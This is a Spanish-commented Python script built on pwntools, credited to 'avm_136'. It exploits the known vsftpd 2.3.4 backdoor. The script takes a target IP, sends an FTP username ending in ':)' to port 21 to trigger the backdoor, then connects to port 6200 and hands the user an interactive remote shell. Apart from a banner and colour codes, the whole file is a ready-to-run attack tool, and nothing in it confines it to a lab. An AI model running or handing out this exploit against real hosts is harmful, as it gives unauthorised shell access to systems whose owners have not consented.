from pwn import *
import sys

# Definición de colores (Códigos ANSI)
R = "\033[31m"  # Rojo
G = "\033[32m"  # Verde
B = "\033[34m"  # Azul
Y = "\033[33m"  # Amarillo
C = "\033[36m"  # Cian
M = "\033[35m"  # Magenta
W = "\033[0m"   # Reset (Blanco/Normal)
BOLD = "\033[1m"

context.log_level = 'error'

def banner_estetico():
    print(f"{C}{BOLD}" + "="*45)
    print(f"   vsftpd 2.3.4 Backdoor Exploit - Python")
    print(f"   Hecho por: avm_136")
    print("="*45 + f"{W}")

def exploit():
    # Validación de parámetros
    if len(sys.argv) < 2:
        print(f"\n{Y}[!] Uso: python3 {sys.argv[0]} <IP_OBJETIVO>{W}")
        print(f"{Y}[*] Ejemplo: python3 {sys.argv[0]} 192.168.1.100{W}\n")
        sys.exit(1)

    host = sys.argv[1]
    port_ftp = 21
    port_backdoor = 6200

    # Enviar el payload
    print(f"{Y}[+]{W} Atacando objetivo {BOLD}{host}{W}...")
    try:        
        r = remote(host, port_ftp, timeout=5)
        banner = r.recvline().decode() # Banner
        print(f"{Y}[+]{W} Banner FTP detectado: {banner.strip()}")

        print(f"{Y}[+]{W} Enviando el payload...")
        r.sendline(b"USER hacking:)")
        r.sendline(b"PASS pwned")
        
        sleep(1.5)
        r.close()
        
    except Exception as e:
        print(f"{R}[!]{W} Error en fase de payload: {e}")
        return

    # Conexión a la shell remota
    try:
        print(f"{Y}[+]{W} Conectando al puerto {BOLD}{port_backdoor}{W}...")
        shell = remote(host, port_backdoor, timeout=5)
        
        print(f"{G}[*]{W} ¡Shell obtenida con éxito!")

        # Hacer la shell interactiva
        shell.interactive()
        
    except Exception:
        print(f"{R}[!]{W} No se pudo conectar al backdoor. Revisa si la IP es correcta o si ya hay una sesión abierta.")

if __name__ == "__main__":
    banner_estetico()
    exploit()
